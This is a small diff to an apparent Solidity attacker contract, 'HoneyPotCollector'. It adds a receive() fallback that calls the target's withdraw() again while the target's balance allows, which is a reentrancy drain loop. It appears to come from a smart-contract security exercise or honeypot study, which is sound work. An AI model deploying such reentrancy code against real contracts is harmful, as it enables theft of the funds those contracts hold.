@@ -36,4 +36,9 @@ contract HoneyPotCollector {
         honeyPot.withdraw();
         kill;
     }
+    receive() external payable {
+        if(address(honeyPot).balance >= msg.value){
+            honeyPot.withdraw();
+        }
+    }
 }
